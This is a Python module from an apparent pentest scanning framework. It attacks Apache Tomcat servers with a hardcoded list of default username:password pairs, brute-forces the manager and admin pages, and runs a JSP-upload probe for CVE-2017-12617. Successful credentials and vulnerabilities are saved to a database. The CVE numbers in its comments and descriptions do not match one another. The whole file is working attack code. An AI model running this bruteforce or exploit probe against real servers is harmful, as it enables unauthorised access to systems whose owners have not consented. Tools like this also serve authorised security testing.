import os.path

from utils.output import Output
from utils.db import DB
from utils.utils import gen_random_string, gen_bruteforce_creds
from lib.httpscan.http import HTTP

creds = [
    "admin:",
    "admin:admanager",
    "admin:admin",
    "ADMIN:ADMIN",
    "admin:adrole1",
    "admin:adroot",
    "admin:ads3cret",
    "admin:adtomcat",
    "admin:advagrant",
    "admin:password",
    "admin:password1",
    "admin:Password1",
    "admin:tomcat",
    "admin:vagrant",
    "admin:j5Brn9",
    "both:admanager",
    "both:admin",
    "both:adrole1",
    "both:adroot",
    "both:ads3cret",
    "both:adtomcat",
    "both:advagrant",
    "both:tomcat",
    "cxsdk:kdsxc",
    "j2deployer:j2deployer",
    "manager:",
    "manager:tomcat",
    "manager:s3cret",
    "manager:admanager",
    "manager:admin",
    "manager:adrole1",
    "manager:adroot",
    "manager:ads3cret",
    "manager:adtomcat",
    "manager:advagrant",
    "manager:manager",
    "ovwebusr:OvW*busr1",
    "QCC:QLogic66",
    "role1:admanager",
    "role1:admin",
    "role1:adrole1",
    "role1:adroot",
    "role1:ads3cret",
    "role1:adtomcat",
    "role1:advagrant",
    "role1:role1",
    "role1:tomcat",
    "role:changethis",
    "root:admanager",
    "root:admin",
    "root:adrole1",
    "root:adroot",
    "root:ads3cret",
    "root:adtomcat",
    "root:advagrant",
    "root:changethis",
    "root:owaspbwa",
    "root:password",
    "root:password1",
    "root:Password1",
    "root:r00t",
    "root:root",
    "root:toor",
    "tomcat:",
    "tomcat:admanager",
    "tomcat:admin",
    "tomcat:adrole1",
    "tomcat:adroot",
    "tomcat:ads3cret",
    "tomcat:adtomcat",
    "tomcat:advagrant",
    "tomcat:changethis",
    "tomcat:password",
    "tomcat:password1",
    "tomcat:s3cret",
    "tomcat:tomcat",
    "tomcat:manager",
    "tomcat:cattom",
    "xampp:xampp",
    "server_admin:owaspbwa",
    "admin:owaspbwa",
    "demo:demo",
]

class Module:
    name = 'Tomcat'
    description = 'Discover and exploit tomcat (bruteforce, CVE-2017-12615, TODO: CVE-2020-1938, CVE-2020-9484)'

    def run(self, target, args, useragent, proxy, timeout, safe):
        http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)

        Output.minor({'target': http.url(target['path']), 'message': '[%s] Running module...' % self.name})

        tomcat_urls = ['manager/html', 'admin/html']

        # Try CVE-2017-12617
        random_str = gen_random_string()
        payload='<%% out.println("%s");%%>' % random_str
        data = http.put(os.path.join(target['path'], "%s.jsp" % random_str) + "/", data=payload)

        if data and data['code'] in [201]:
            data = http.get(os.path.join(target['path'], "%s.jsp" % random_str))

            if random_str in data['html'] and not payload in data['html']:
                Output.vuln({'target': http.url(target['path']), 'message': '[%s] Vulnerable to Apache Tomcat RCE (CVE-2017-12617)' % self.name})

                vuln_info = {
                    'hostname': target['hostname'],
                    'port': target['port'],
                    'service': 'http',
                    'url': http.url(target['path']),
                    'name': 'Apache Tomcat RCE (CVE-2017-12617)',
                    'description': 'Server %s vulnerable to Apache Tomcat RCE (CVE-2017-12612)' % http.url(target['path']),
                }
                DB.insert_vulnerability(vuln_info)

        for url in tomcat_urls:
            output = http.get(os.path.join(target['path'], url))

            if not output or not output['code'] in [401] or not 'tomcat' in output['title'].lower():
                continue

            http_info = {
                'hostname': target['hostname'],
                'port': target['port'],
                'protocol': 'tcp',
                'service': 'http',
                'url': http.url(os.path.join(target['path'], url)),
                'http': {
                    'path': os.path.join(target['path'], url),
                    'code': output['code'],
                    'server': output['server'],
                    'title': output['title'],
                    'content-type': output['content-type'],
                },
                'tags': ['tomcat']
            }
            DB.insert_http_url(http_info)

            output['message_type'] = 'http'
            output['target'] = http.url(os.path.join(target['path'], url))
            Output.write(output)

            try:
                auth_type = output['auth_type']

                if args['bruteforce']:
                    Output.highlight({'target': http.url(os.path.join(target['path'], url)), 'message': '[%s] Starting bruteforce...' % self.name})
                    for cred in gen_bruteforce_creds(args['bruteforce'], creds):
                        username, password = cred.split(':')

                        output = http.get(os.path.join(target['path'], url), auth=(auth_type, username, password))

                        if output != None and output['code'] in [200]:
                            Output.success({'target': http.url(os.path.join(target['path'], url)), 'message': '[%s] Authentication success with login %s and password %s' % (self.name, username, password)})

                            cred_info = {
                                'hostname': target['hostname'],
                                'port': target['port'],
                                'service': 'http',
                                'url': http.url(os.path.join(target['path'], url)),
                                'type': 'password',
                                'username': username,
                                'password': password,
                                'tags': ['tomcat'],
                            }
                            DB.insert_credential(cred_info)

                            vuln_info = {
                                'hostname': target['hostname'],
                                'port': target['port'],
                                'service': 'http',
                                'url': http.url(os.path.join(target['path'], url)),
                                'name': 'Default or predictable credentials on Tomcat service',
                                'description': 'Tomcat %s possess the following default or weak credentials: %s:%s' % (http.url(os.path.join(target['path'], url)), username, password),
                            }
                            DB.insert_vulnerability(vuln_info)

            except KeyError:
                pass





